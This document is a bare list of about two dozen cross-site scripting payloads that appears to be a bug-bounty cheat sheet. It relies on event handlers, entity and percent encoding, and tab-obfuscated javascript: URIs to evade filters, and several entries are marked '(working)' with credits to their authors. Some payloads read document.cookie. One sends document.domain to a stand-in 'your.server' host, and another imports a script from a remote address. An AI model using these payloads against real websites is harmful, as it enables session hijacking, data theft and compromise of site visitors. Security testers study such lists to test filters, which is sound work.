
--------------

----------------------

<a"/onclick=(confirm)()>Click Here!
Dec: <svg onload=prompt%26%230000000040document.domain)>
Hex: <svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
javascript:{ alert`0` }
1'"><img/src/onerror=.1|alert``>
<img src=x onError=import('//1152848220/')>
%2sscript%2ualert()%2s/script%2u
<svg on onload=(alert)(document.domain)>
<img ignored=() src=x onerror=prompt(1)>
<svg onx=() onload=(confirm)(1)>
“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
<svg on =i onload=alert(domain) (working)
<svg/onload=location/**/='https://your.server/'+document.domain>
<svg onx=() onload=window.alert?.()> (working)
test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic
"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan
%27%09);%0d%0a%09%09[1].find(alert)//
"><img src=1 onmouseleave=print()> - @itsgeekymonk
<svg on onload=(alert)(document.domain)> -@zapstiko
<svg/on%20onload=alert(1)> (working) -@aufzayed
<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi